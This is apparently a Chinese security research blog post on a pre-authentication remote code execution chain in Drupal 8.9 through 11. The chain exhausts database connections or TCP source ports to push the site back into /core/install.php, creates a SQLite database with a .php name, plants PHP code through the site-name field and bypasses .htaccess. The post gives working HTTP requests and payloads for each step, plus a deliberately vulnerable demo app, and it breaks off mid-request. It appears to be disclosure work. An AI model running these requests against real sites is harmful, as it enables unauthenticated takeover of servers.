#  Fail2Install：把系统限制变成 Drupal 的预认证 RCE  
 幻泉之洲   2026-11-28 02:52  
  
>   
> [1]  
>   
  
## 一个被当成 DoS 的问题，为什么能变成 RCE  
  
系统资源耗尽，业内长期把它归到可用性问题的抽屉里。文件描述符用完、数据库连接占满、临时端口分配不出来，结果无非是应用变慢、部分功能报错，最坏也就是服务不可用。这类问题通常连安全公告都进不去，顶多算个运维事故。  
  
但研究团队换了个问法：如果应用捕获了这些失败，还把它当成一种可信状态继续往下走，会发生什么？那么拒绝服务就不再是终点，可能变成攻击链的起点。资源耗尽本身不执行代码，它只是一个触发器，真正被利用的是错误处理逻辑里的假设。  
  
这个思路被套到 Drupal 上，结局是一个预认证 RCE。影响范围是 Drupal 8.9、9、10、11，四种部署组合全部中招：Apache 配 PostgreSQL、Apache 配 MySQL、PHP-FPM 配 PostgreSQL、PHP-FPM 配 MySQL。都是官方镜像拉下来就能复现的默认环境，不需要什么特殊插件或额外配置。说实话，这个覆盖面比漏洞本身的 CVSS 评分更值得警惕。  
  
先说清楚一点：这个 Drupal 漏洞最后被标成 ANT-2026-GMRPK0BU 的重复。研究团队自己也承认，漏洞本身不算新发现。他们坚持写这篇文章的理由是另一件事，利用系统限制在原生 Drupal 配置上把问题做成可利用状态，这套方法此前没人系统讲过。  
## EMFILE：打开的文件太多了  
  
研究的第一个入口是 RLIMIT_NOFILE  
。这个限制决定了一个进程同时能打开多少个文件描述符，文件、套接字、管道都算在内。每个进程一份，里面有两个值：  
- **rlim_cur**  
：软限制，内核当前实际执行的数值。  
  
- **rlim_max**  
：硬限制，普通非特权进程能设置到的软限制上限。  
  
这两个数不是拍脑袋定的，取决于 init 系统、服务配置、容器运行时和应用程序本身。举几个实际数字：systemd 默认软限制 1,024，硬限制 524,288。Docker 旧版本把默认软限制设成了 1,048,576，从 Docker Engine 29.0.0 起这个值被移除了，容器现在直接继承 containerd 服务的限制。  
  
关键点在这里：这些只是基线。进程完全可以根据自己的需要，把软限制往下调，或者在硬限制以内往上抬。所以光看 systemd 的默认值没用，得看运行时初始化之后留下的有效值。  
  
几个主流运行时在 systemd 默认限制下启动后的有效值：  
<table><thead><tr><th><section><span leaf="">运行时</span></section></th><th><section><span leaf="">软限制</span></section></th><th><section><span leaf="">硬限制</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">Node.js 24.21</span></section></td><td><section><span leaf="">524,288</span></section></td><td><section><span leaf="">524,288</span></section></td></tr><tr><td><section><span leaf="">PHP 8.5 CLI / Apache / FPM</span></section></td><td><section><span leaf="">1,024</span></section></td><td><section><span leaf="">524,288</span></section></td></tr><tr><td><section><span leaf="">CPython 3.14</span></section></td><td><section><span leaf="">1,024</span></section></td><td><section><span leaf="">524,288</span></section></td></tr><tr><td><section><span leaf="">Ruby 3.4</span></section></td><td><section><span leaf="">1,024</span></section></td><td><section><span leaf="">524,288</span></section></td></tr><tr><td><section><span leaf="">OpenJDK / HotSpot 25</span></section></td><td><section><span leaf="">524,288</span></section></td><td><section><span leaf="">524,288</span></section></td></tr></tbody></table>  
看这张表就能发现一个不太对劲的地方。Node.js 和 JVM 一启动就把软限制拉到跟硬限制齐平，几十万个描述符随便用。PHP、Python、Ruby 则老老实实留在 1,024。这不是巧合，是各运行时对自身场景的判断不同：Node 和 JVM 天然要处理大量并发连接，PHP-FPM 的典型模型是一个请求走完就释放，1,024 在正常流量下够用。  
  
但"正常流量"这个词本身就是个假设。1,024 意味着一个 PHP-FPM worker 同时最多也就千把个描述符，攻击者只要能稳定占住一部分不断开，剩下的空间就不多了。而进程一旦碰到 EMFILE，新的连接、新的文件、新的套接字全都创建失败。对攻击者来说，这是一个可预测、可重复、几乎零成本的状态，不需要任何凭据。  
  
更深一层的问题在于：资源耗尽的状态如果持续得够久，应用就会开始执行那些本该很少走到的错误分支。而错误分支，恰恰是开发者测试覆盖最薄的地方。研究者的判断很直接，把系统限制作为安全原语（security primitive）来研究，比逐个找具体的输入验证漏洞更划算。Drupal 的案例就是这句话的证据。  
  
接下来的部分会进入具体路径：/core/install.php  
 为什么会成为入口，Drupal 如何把数据库连接失败当成可信状态，以及从安装器重入到最终 RCE 的完整链条。系统限制只是敲门砖，门后面藏着的是 Drupal 对失败的处理方式。  
  
原文发布日期标注为 2026 年 11 月 24 日，阅读时长约 20 分钟。文中所有版本号与限制数值均来自公开的运行时源码与官方文档。  
  
当这个上限被打满时，任何新建文件描述符的操作都会返回 EMFILE: Too many open files。单看这行报错没什么特别，有意思的地方在于接下来会发生什么：如果应用在文件访问失败后有一段"兜底"逻辑，而这段兜底恰好指向一份默认配置、一个默认用户档案，或者任何会削弱安全性的东西，问题就来了。  
  
import json  
  
from fastapi import FastAPI  
  
  
app = FastAPI()  
  
files = {}  
  
DEFAULT_CONFIG = {"requires_auth": False}  
  
  
@app.get("/file/{key}")  
  
def file(key: str):  
  
    files[key] = open("data.txt", encoding="utf-8")  
  
    return files[key].read()  
  
  
@app.get("/admin")  
  
def admin():  
  
    try:  
  
        with open("config.json", encoding="utf-8") as config_file:  
  
            config = json.load(config_file)  
  
    except OSError:  
  
        config = DEFAULT_CONFIG  
  
  
    return {"access": "denied" if config["requires_auth"] else "admin"}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeGxdqAW0zMDKLCsDljp09a1JHSGvtXTp4Fic3rMdwYeD7TaTD0bjgLEqgWiamolnIckYhfhibkWDqH0oAf7eK7IvSur78T4uMKAU/640?wx_fmt=png&from=appmsg "")  
  
上图演示的就是典型的场景——靠 FD（file descriptor，文件描述符）耗尽完成认证绕过。请求里带上不同的 key 值，全局的 files 变量就会在请求之间保留住文件对象，这些描述符一直开着，直到进程撞上 RLIMIT_NOFILE（单进程可打开文件数上限）。此时再去读 config.json 就会抛出 EMFILE，应用回退到 DEFAULT_CONFIG，而那份默认配置里认证是关掉的。  
  
路子是对的，但硬性约束不少。  
  
第一，文件描述符得跨请求存活，或者在单次请求内攒够数量，后者明显不现实。这一条完全取决于服务器和运行时生命周期。Uvicorn[2]  
能在多个请求之间复用同一个 Python worker，模块级变量和它持有的描述符就留了下来。换成 Apache + mod_php 就不行，每个请求都新建独立的 PHP 请求上下文，请求作用域内的变量和资源在 shutdown 阶段一并销毁[3]  
。  
  
第二，应用必须捕获这个错误，并且真的选了一条不安全的兜底路径。两个条件同时成立的概率不高。  
  
说白了，EMFILE 没有我们预期的那么通用。但它把思路验证了——用资源上限去逼应用走另一条代码路径，这条路值得继续往下推。  
## SQLSTATE[HY000] [1040] Too many connections  
  
第二个被拿来当"小工具"的限制是数据库连接数，通常在配置里写作 max_connections。它规定了数据库同一时刻能接多少条连接。拿 PDO/MySQL 的报错原文 SQLSTATE[HY000] [1040] Too many connections 直接搜一下，结果数量说明这个上限的覆盖面比 EMFILE 大得多。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibfpAscwiaBfkqAyvePVU03GOhM2n7IqQqWicrGWMGCpkYkyMjUNV3Hr8ZibQbOicARHYWViaju21VRwNpWCxPdIAfDe6ZmUIgXdWh8A/640?wx_fmt=png&from=appmsg "")  
  
几大主流数据库的默认连接上限如下：  
<table><thead><tr><th><section><span leaf="">Docker 镜像</span></section></th><th><section><span leaf="">连接上限</span></section></th><th><section><span leaf="">来源</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">postgres:18.6</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[4]</span></sup></section></td><td><section><span leaf="">97 条普通连接，超级用户 POSTGRES_USER 可用 100 条</span></section></td><td><section><span leaf="">&#34;max_connections = 100&#34;，其中 3 个槽位保留</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[5]</span></sup></section></td></tr><tr><td><section><span leaf="">mysql:8.4.9</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[6]</span></sup></section></td><td><section><span leaf="">151 条普通连接，外加 1 条保留的管理连接</span></section></td><td><section><span leaf="">&#34;max_connections = 151&#34;</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[7]</span></sup><span leaf="">、保留管理连接说明</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[8]</span></sup></section></td></tr><tr><td><section><span leaf="">mcr.microsoft.com/mssql/server:2025-latest</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[9]</span></sup></section></td><td><section><span leaf="">最多 32,767 条用户连接</span></section></td><td><section><span leaf="">&#34;user connections = 0&#34; 时自动取 32,767 上限</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[10]</span></sup></section></td></tr></tbody></table>  
MSSQL 列在这里只是作对照，后面只讨论 MySQL 和 PostgreSQL。  
  
再看 PHP 应用部署里常见组件的默认并发能力：  
<table><thead><tr><th><section><span leaf="">Docker 镜像 / 部署方式</span></section></th><th><section><span leaf="">Worker 数量</span></section></th><th><section><span leaf="">来源</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">php:8.5-apache</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[11]</span></sup><span leaf="">（mod_php）</span></section></td><td><section><span leaf="">150 个 PHP/Apache worker</span></section></td><td><section><span leaf="">启用 Prefork</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[12]</span></sup><span leaf="">，MaxRequestWorkers 150</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[13]</span></sup></section></td></tr><tr><td><section><span leaf="">php:8.5-fpm</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[14]</span></sup></section></td><td><section><span leaf="">每个副本 5 个 PHP worker</span></section></td><td><section><span leaf="">pm.max_children = 5</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[15]</span></sup></section></td></tr><tr><td><section><span leaf="">httpd:2.4.69</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[16]</span></sup></section></td><td><section><span leaf="">400 个请求线程</span></section></td><td><section><span leaf="">16 进程 × 25 线程</span><sup style="font-size:10px;color:#999;margin-left:1px;"><span leaf="">[17]</span></sup></section></td></tr></tbody></table>  
为了讲清楚，后面用 PHP 举例。换别的语言，思路一样。  
  
把两张表放在一起看，这个问题就有意思了。  
  
php:8.5-apache 默认给 150 个 worker，MySQL 默认 max_connections 是 151。如果每个请求全程占住一条连接，150 个并发请求打满，离 151 还差一条——差这一条就打不出 1040 错误。这个数字对得太整齐了，不像巧合，更像是两边各自留了一点余量。想真正触发，要么单请求内并发多开连接（嵌套查询、多数据源都可能），要么横向扩副本，要么把 max_connections 调小。php:8.5-fpm 那边更极端，默认只有 5 个 worker，靠单个副本去撞 151 连接的上限完全不现实，得堆几十个副本才行。  
  
换言之，判定条件可以简化成一句话：应用能同时占住的连接数必须够到数据库的上限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeerVCeyGn7qV6nWIV3XUOA6HeQUrq1m80xutjFyEjpIqnSjfzIE68QlzaR2nIbhGrBG1KVjsvibiaa7BnCooaLQbicIDvBic79qa0/640?wx_fmt=png&from=appmsg "")  
  
安装脚本是最容易想到的一类端点。现代应用几乎都暴露一个安装入口，只有在检查发现数据库连不上、必需的库表不存在、或者配置文件缺失时，才允许继续往下走。WordPress 的 wp-admin/install.php  
、Drupal 的 core/install.php  
、Strapi 的首次管理员创建路由，逻辑都差不多：先探测，再决定要不要安装。  
  
探测本身就是开销。判断"是否已安装"往往不是一次简单的 SELECT 1  
，而是要连数据库、查 schema、读配置，有些实现还会在一次请求里对多个数据库或缓存后端分别建连。这正是上一节那句话的现实载体——**一次 HTTP 请求可以合法地占住多条数据库连接**  
。  
  
try {  
  
    $database = new PDO('pgsql:host=db;dbname=app', 'app', 'app', [  
  
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,  
  
    ]);  
  
    $installed = $database->query('SELECT installed FROM config')->fetchColumn();  
  
} catch (PDOException) {  
  
    $installed = false;  
  
}  
  
  
header('Content-Type: application/json');  
  
echo json_encode([  
  
    'status' => $installed ? 'already installed' : 'start installation',  
  
]);  
  
拿这个脚本去撞数据库连接上限，结果完全取决于 PHP 运行方式和数据库引擎的组合。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibcEoWCyNemp281emxVBicKljpkOMeOUA2t05P4FnjJA4Oiat0GkcXXZPtZOd1Zcld7Xqib2ZxBqLVTammTQK2lAVR1KOVYGvD9jxE/640?wx_fmt=png&from=appmsg "")  
  
▲ "Too many connections" 是否可达，取决于 PHP 运行时与数据库服务器的搭配  
  
PostgreSQL 默认的连接槽位数比 Apache 的 HTTP worker 少，所以这是默认配置下最容易复现的一组。往 install.php 打足够多的并发请求，连接池被占满，探测语句抛错，代码走进 fallback 分支，一个新网站的安装流程就被拉起来了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeibaoicXsibiaRWYD8WkX30icgiaHG6jj2nwKiasJDXtdicRSaYLs7uWeE8j7tZqcKFwpGtVWcOyIeuJY1tHdhkU9eRZs8l1a2seX5Xw4/640?wx_fmt=png&from=appmsg "")  
  
▲ 通过耗尽连接触发安装器回退  
  
Apache 加 MySQL 的组合要难一点，但不是做不到。同一个应用里任何其他端点，只要单次请求里会同时打开两条以上数据库连接，都能复现同一个问题。  
  
到了 PHP-FPM 这里，这个错误 gadget（利用链中的一小段逻辑）就很不实用了。官方 php:8.5-fpm  
 镜像默认只跑 5 个 worker。想让空闲数据库上的 MySQL 默认连接上限被打满，每个活跃请求得同时抓住至少 31 条连接。特定应用行为和部署配置也许能做到，但已经脱离现实。  
## 换一条路：从服务端上限转到客户端端口池  
  
找绕过 PHP-FPM worker 限制的办法时，我们注意到 Linux 对 TCP TIME_WAIT 的处理方式。  
  
一次正常的 TCP 关闭过程中，先发出 FIN 的那一端会把已关闭连接的元组留在 TIME_WAIT 状态里，大约 60 秒。这样最后的 ACK 还能重传，旧连接的延迟报文也不会被新连接误收。写过 socket 的人都踩过这个坑：小 Python TCP 服务按 Ctrl+C 停掉再立刻重启，会报 OSError: [Errno 98] Address already in use  
，然后等一分钟才恢复正常。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibd3ZWHTlD0lhan7xhBe4nll4mBr3ribzaicFCbVOKlhEcm3ibFcH5Dee2mVjBXaYicY5sJNaRexozjBGerCBEicHuJmS9AMaoIDp49U/640?wx_fmt=png&from=appmsg "")  
  
▲ Linux 的 TIME_WAIT 处理  
  
Linux 默认从 32768–60999 分配临时源端口，一共 28232 个。一条 TCP 连接由源 IP、源端口、目的 IP、目的端口四元组唯一确定。所以同一个源端口换个目的地还能复用，因为四元组不同；但对同一个目的地址，只要旧元组还在 TIME_WAIT 里，这个端口就动不了。  
  
那么，当 PHP 到数据库没有可用的源端口时会怎样？  
  
PDO/MySQL 下一次连接尝试会直接抛出客户端错误：SQLSTATE[HY000] [2002] Cannot assign requested address  
。  
  
要打穿某个数据库端点的源端口池，得在 60 秒的 TIME_WAIT 窗口内占满全部 28232 个元组。折算下来大约是每秒 471 条新建数据库连接进入 PHP 侧的 TIME_WAIT。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibchbc5tdVgnXZEcpjcxC7vicOl9QMh2zCLwdd6a6jBGg0OE3FwbVHricwsuLbKHvuFKYQfp3r1HhWic9XhAeRccJJchcertu29LCo/640?wx_fmt=png&from=appmsg "")  
  
▲ TCP 源端口耗尽流程  
  
这个数字值得停一下。原本的战场是服务端的 151 个连接槽位，那是引擎层的硬上限，有排队、有超时、有错误码。现在换成了客户端的 28232 个端口，看上去大了两个数量级，但它是一块不设防的环形数组——不排队，不回收，不区分谁是谁，60 秒内不放手就是不放手。  
  
对 5 个 PHP-FPM worker 来说，471 次/秒意味着每个 worker 每秒要完成近 100 次建连失败或销毁。这谈不上轻松，但只要建连路径足够短——连上就报错、不跑查询、不解析握手后的内容——就不是不可能。上一节算不出来的那笔账，在这里换了计价单位。  
  
所以在前面那个实验环境里，只要请求量够，下面这几种部署组合都能用这套手法走到安装流程：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeC47icibgtU8LNXu8YMCXPicVtCX0QLb89eSLs9uZ9HJNaqTbgurKYmcUgHwKuOOF1j0XERIHOMUOMAYr0blmfrt3icjGpfNQIYGU/640?wx_fmt=png&from=appmsg "")  
  
▲ "Cannot assign requested address" 是否可达，取决于 PHP 运行时与数据库服务器的搭配  
  
PHP-FPM 配 MySQL 的实际结果如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfPhHyEbzesykciaPianUSRb7Mibco3aXyO7CZOicLojWjgicbtibiaBK8v03Ex9dtgeng9ia4xIggWDN12EDNkibV7lF9eewoBbl6fxVqQ/640?wx_fmt=png&from=appmsg "")  
  
▲ 通过源端口耗尽触发安装器回退  
## Drupal 案例：/core/install.php  
  
进入 Drupal 的 /core/install.php  
 具体代码之前，先看一张高度简化的安装器流程图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibcs0DZTekmmc1jibHwFYEY0yibcibe26807s56UwSzbARlDoml7LrfKFwNfN7Ty7sWWSTze8GpZMnSyVj0c2zL49zicW0jlr0DECWc/640?wx_fmt=png&from=appmsg "")  
  
▲ Drupal 的 /core/install.php 简化流程概览  
  
这张流程图已经透露了不少信息：第一次、第二次数据库连接都失败，但第三次成功，安装程序就会跑起来。结合前面的分析，这里能动手脚的空间已经很明显了。  
## Drupal 的三次数据库连接尝试  
  
翻源码细看。install_verify_database_settings()  
 负责读取已存的数据库凭据，并执行第一次连接检查[18]  
：  
  
$install_state['database_verified'] = install_verify_database_settings($site_path);  
  
  
// [...]  
  
  
function install_verify_database_settings($site_path) {  
  
  if ($database = Database::getConnectionInfo()) {  
  
    $database = $database['default'];  
  
    $settings_file = './' . $site_path . '/settings.php';  
  
    $errors = install_database_errors($database, $settings_file);  
  
    if (empty($errors)) {  
  
      return TRUE;  
  
    }  
  
  }  
  
  return FALSE;  
  
}  
  
光看这段代码看不出什么。实际上，install_database_errors()[19]  
在背后调用了下面这个 connect()  
 函数[20]  
：  
  
protected function connect() {  
  
  try {  
  
    Database::setActiveConnection();  
  
    Database::getConnection();  
  
    $this->pass('Drupal can CONNECT to the database ok.');  
  
  }  
  
  catch (\Exception $e) {  
  
    $this->fail(/* ... */);  
  
    return FALSE;  
  
  }  
  
  
  return TRUE;  
  
}  
  
关键就在这里：如果抛出的是 SQLSTATE[HY000] [1040] Too many connections  
（连接数超限）错误，$install_state['database_verified']  
 会被置为 FALSE，但安装流程并不会因此中止。错误被吞掉了，流程继续往下走。  
  
接着进入第二次数据库连接检查[21]  
，问题就出在这一步：  
  
$existing_install = FALSE;  
  
if (Database::getConnectionInfo()) {  
  
  try {  
  
    $existing_install = Database::getConnection()->schema()->tableExists($table);  
  
  }  
  
  // Do not trigger an error if the database query fails, since the database  
  
  // might not be set up yet.  
  
  catch (\Exception) {  
  
  }  
  
}  
  
if ($existing_install) {  
  
  throw new AlreadyInstalledException(\Drupal::service('string_translation'));  
  
}  
  
$existing_install  
 默认是 FALSE，意思是这个阶段 Drupal 还没检测到已有安装。即使凭据已经从 settings.php[22]  
里读出来了、上一次连接也已经失败过，这次连接失败抛出的异常依然被忽略，$existing_install  
 保持 FALSE 不变。  
  
然后 Drupal 第二次调用 install_database_errors()[23]  
。这个阶段如果连接报错，Drupal 会显示一个「Requirements problem」（环境要求不满足）页面，而不是继续安装。  
  
$errors = install_database_errors($database, $settings_file);  
  
  
if (count($errors)) {  
  
  $requirements['database_install_errors'] = [  
  
    'title' => t('Database settings'),  
  
    'description' => SiteSettingsForm::getDatabaseErrorsTemplate($errors),  
  
    'severity' => RequirementSeverity::Error,  
  
  ];  
  
}  
  
  
// [...]  
  
  
$severity = RequirementSeverity::maxSeverityFromRequirements($requirements);  
  
  
if ($severity === RequirementSeverity::Error) {  
  
  $build['#title'] = t('Requirements problem');  
  
  $build['#suffix'] = t(  
  
    'Check the messages and try again.',  
  
    [':url' => drupal_requirements_url($severity)]  
  
  );  
  
  
  return $build;  
  
}  
  
所以逻辑变得很微妙：只要这一次连接成功，Drupal 就会启动一次全新的安装，允许我们把整站重装一遍，顺便创建自己的管理员账号。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibeHOgRhokIGoxqIHGFqh2xUyRIJsSCjzibodXmB26GuTM1FIuWnfMzE2icYU8I0p0phYR9SsGlpwx7voVeM4BfcSvSSliab6HEdt4/640?wx_fmt=png&from=appmsg "")  
  
▲ Drupal 安装器界面  
## 从重入安装器到 RCE  
  
既然能重新安装，拿 RCE 的常规思路就是：走完安装流程、建管理员账号、装一个能执行任意命令的模块。路径清晰，但步骤多。  
  
实际操作时找到了更直接的一条路。Drupal 安装器支持 SQLite 数据库文件[24]  
，并且允许在安装过程中自行指定数据库路径。这个路径会被直接传给 SQLite 连接[25]  
：  
  
public static function open(array &$connection_options = []) {  
  
  // [...]  
  
  
  if (\PHP_VERSION_ID >= 80400) {  
  
    $sqlite = new SqliteConnection(  
  
      'sqlite:' . $connection_options['database'],  
  
      '',  
  
      '',  
  
      $connection_options['pdo']  
  
    );  
  
  }  
  
  else {  
  
    $sqlite = new PDOConnection(  
  
      'sqlite:' . $connection_options['database'],  
  
      '',  
  
      '',  
  
      $connection_options['pdo']  
  
    );  
  
  }  
  
}  
  
把路径选成文档根目录下以 .php  
 结尾的文件，安装器就会创建一个扩展名为 PHP 的 SQLite 数据库：  
  
POST /core/install.php?langcode=en&profile=standard HTTP/1.1  
  
Host:   
  
Content-Type: application/x-www-form-urlencoded  
  
Connection: close  
  
  
driver=Drupal%5Csqlite%5CDriver%5CDatabase%5Csqlite&Drupal%5Csqlite%5CDriver%5CDatabase%5Csqlite%5Bdatabase%5D=%2Fopt%2Fdrupal%2Fweb%2Fmodules%2Fdrupal-rce.php&Drupal%5Csqlite%5CDriver%5CDatabase%5Csqlite%5Bprefix%5D=&form_id=install_settings_form&op=Save+and+continue  
  
安装走到站点配置表单这一步时，Drupal 会把提交的网站名[26]  
存进 SQLite 数据库。网站名填 PHP 代码，payload 的字节就会被写进这个 .php  
 数据库文件：  
  
POST  HTTP/1.1  
  
Host:   
  
Cookie:   
  
Content-Type: application/x-www-form-urlencoded  
  
Connection: close  
  
  
site_name=%3C%3Fphp+echo+%22RCE%22%3B+__halt_compiler%28%29%3B&&form_id=install_configure_form&op=Save+and+continue  
  
原生 Apache 部署下，直接访问生成的文件会被 Drupal 自带的 .htaccess[27]  
拦下：  
  
# Allow access to PHP files in /core (like authorize.php or install.php):  
  
RewriteCond %{REQUEST_URI} !/core/[^/]*\.php$  
  
  
# [...]  
  
  
# Deny access to any other PHP files that do not match the rules above.  
  
RewriteRule "^(.+/.*|autoload)\.php($|/)" - [F]  
  
但那条例外规则只看请求 URI 是否以 /core/.php  
 结尾，并没有锚定到路径开头。于是下面这个路径就能绕过 deny 规则：  
  
GET /modules/drupal-rce.php/core/x.php HTTP/1.1  
  
Host:   
  
Connection: close  
  
请求 URI 以 /core/x.php  
 结尾，.htaccess 里的条件就把它当成允许访问的核心 PHP 文件放行。Apache 随后执行的是 /modules/drupal-rce.php  
，并把 /core/x.php  
 当作 PATH_INFO 处理，任意 PHP 代码就这么跑起来了。  
  
说实话，这条链比「装模块」那套要干净得多——省掉了管理员登录、模块上传、权限校验一整套流程。.htaccess 那个正则没锚定开头，是整条链上最巧的一环，也说明安全检查写下时只考虑了「正常部署下 URI 长什么样」，没考虑被安装器重写后的场景。  
  
理论讲完。接下来看这套东西在四种主要 Drupal 部署配置里怎么落地。  
## Apache 搭配 PostgreSQL  
  
把数据库连接数顶到上限、再凑出 FAIL、FAIL、SUCCESS 这个节奏，在默认配置下并不难。Apache 的 MaxRequestWorkers 是 150[13]  
，PostgreSQL 的 max_connections 是 100[5]  
。两个上限之间存在明显的差值，而这个差值就是可以操作的空间。  
  
想要让竞争更可靠，需要一个能长时间占用数据库连接、并同时返回大响应的端点——连接什么时候释放，取决于响应什么时候写完，这就给了我们控制权。严格来说这不是必需的，很多端点大概都能干这活。本次研究用的是 asset 端点[28]  
，它接收一个 include GET 参数[29]  
，把它解压[30]  
，然后抛出一个会把该值原样反射回响应的错误[31]  
。压缩比带来了相当可观的响应体积放大。  
  
GET /sites/default/files/css/css_x.css?theme=olivero&delta=0&language=en&include=&_format=json HTTP/1.1  
  
Host:   
  
Accept-Encoding: identity  
  
Connection: close  
  
拿这个端点当「连接占用器」，就能拼出下面这条链：在 PostgreSQL 的 max_connections 和 max_connections - 1 之间来回切换，制造出脆弱的 FAIL、FAIL、SUCCESS 序列。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdiaibJxOBHgrXwD4BayhnicObEicmcS0nvWFjKYrxUnv7aEzHmPCn02WDL35WQEIKMs91a7AicF5A500kvFeib4CgbQkLKic1TicP1Dao/640?wx_fmt=png&from=appmsg "")  
  
▲ Apache + PostgreSQL 环境下 Drupal 的漏洞利用链序列  
  
在一套原装的 Drupal[32]  
+ PostgreSQL[33]  
安装上，完整利用链跑起来是这样的：  
  
## Apache → MySQL  
  
换成 Apache（MaxRequestWorkers = 150）+ MySQL（max_connections = 151[7]  
）也没复杂多少。数字上就很微妙：两个上限只差 1，反而比 PostgreSQL 那边更好算。  
  
动态 Drupal 请求触发一个记录事件时，Drupal 会把 Referer 请求头塞进日志上下文[34]  
。Standard 安装配置默认开启 dblog 模块[35]  
，这个上下文就会被写进 watchdog 数据库表。有意思的地方在于插入语句外面包了一层 try ... catch[36]  
：插入一旦抛出数据库异常，Drupal 会另开一条专用连接重试。  
  
$context['referer'] = $request->headers->get('Referer', '');  
  
  
// [...]  
  
  
try {  
  
  $this->connection  
  
    ->insert('watchdog')  
  
    ->fields([  
  
      // [...]  
  
      'referer' => $context['referer'],  
  
      // [...]  
  
    ])  
  
    ->execute();  
  
}  
  
catch (\Exception $e) {  
  
  if (  
  
    ($e instanceof DatabaseException || $e instanceof \PDOException) &&  
  
    $this->connection->getTarget() != self::DEDICATED_DBLOG_CONNECTION_TARGET  
  
  ) {  
  
    $key = $this->connection->getKey();  
  
    $info = Database::getConnectionInfo($key);  
  
    Database::addConnectionInfo(  
  
      $key,  
  
      self::DEDICATED_DBLOG_CONNECTION_TARGET,  
  
      $info['default']  
  
    ); // HERE  
  
    $this->connection = Database::getConnection(  
  
      self::DEDICATED_DBLOG_CONNECTION_TARGET,  
  
      $key  
  
    );  
  
    $this->log($level, $message, $context);  
  
  }  
  
  else {  
  
    throw $e;  
  
  }  
  
}  
  
要让日志插入失败，得借 Drupal 默认的 MySQL 建表逻辑[37]  
和连接初始化逻辑[38]  
，这两处都强制使用 utf8mb4 字符集[39]  
。而 0xFF 这个原始字节不可能出现在合法的 UTF-8 序列里（RFC 3629：https://www.rfc-editor.org/rfc/rfc3629#section-4），MySQL 于是直接以错误 1366[40]  
中止插入：  
  
SQLSTATE[HY000]: General error: 1366  
  
Incorrect string value: '\xFF' for column 'referer' at row 1  
  
下面这个请求会让 Drupal 同时打开它自己的正常连接和那条专用的 dblog 连接：  
  
GET /sites/default/files/css/css_x.css?theme=olivero&delta=0&language=en&include=eNorSElNTElKTU3TT8vMSQUAKM0FYA&_format=json HTTP/1.1  
  
Host:   
  
Referer:   
  
Accept-Encoding: identity  
  
Connection: close  
  
这样一来，后续请求只要响应一直阻塞着没写完，两条数据库连接就一直被攥着不放。拿它去顶 MySQL 的连接上限，成功率比 PostgreSQL 那边更稳——原因很简单，MySQL 的上限只比 Apache 的并发上限多 1，中间的窗口窄到几乎不存在误判空间。  
  
于是 Apache + MySQL 的 FAIL、FAIL、SUCCESS 序列可以改成这样：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibceZ47M9iaTdAwNAUUfdQy26vAeP2hR6wDFUeagKpbPhEEibM57IWM0OUqrtTCiawOohlCrARRrvjhbeIbZBysUDWYjUt4Apia2n1o/640?wx_fmt=png&from=appmsg "")  
  
▲ Apache + MySQL 环境下 Drupal 的漏洞利用链序列  
  
先把 Apache + MySQL 这条路的完整链路摆出来，心里有个全景：  
  
  
▲ 标准 Drupal（Apache + MySQL）安装环境下的完整利用链  
### PHP-FPM 环境下要难一截  
  
换成 PHP-FPM（pm.max_children 默认 5），打法就变了。得先把 Linux 的 TCP 源端口耗光，让大批连接卡在 TIME_WAIT 状态，逼出那条 **SQLSTATE[HY000] [2002] Cannot assign requested address**  
 错误。只有端口分配失败，安装器才会被推到另一条分支上去。  
  
起初我们以为最优解是复用 asset 端点，每个请求开两条数据库连接。算下来每秒大概 236 个请求，就能在 PHP 侧攒出每秒 472 个 TIME_WAIT socket。数字看着挺漂亮。  
  
为了验证，我们在好几种 AWS EC2 实例规格上各跑了五次竞态，记录平均响应速率和 PHP 到 MySQL 的 TIME_WAIT 峰值。结果很失望：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibf7u7WqedpgHf84UOaJKiaNJCwVl0gLmSOoxJzHKZtv5z5RfWqqMZ66qwQM2iaCoK9ddemhyXCql4EDMB59y9510HMicJicTQeJRhY/640?wx_fmt=png&from=appmsg "")  
  
▲ 双 PDO 连接方案在各 EC2 实例规格上的压测数据  
  
通过 asset 端点打源端口耗尽，至少得 8 vCPU 的机器才撑得住。说"现实中存在"也不算错，总会有这样的服务器在跑。但我们想把技术再往前推一步，覆盖尽量多的配置，8 vCPU 这个门槛太高了。  
  
于是换个思路：不优化每请求的连接数，去找一个处理更快的端点。让 AI 帮忙筛了一遍候选，捞出来这个：  
  
POST /core/authorize.php HTTP/1.1  
  
Host:   
  
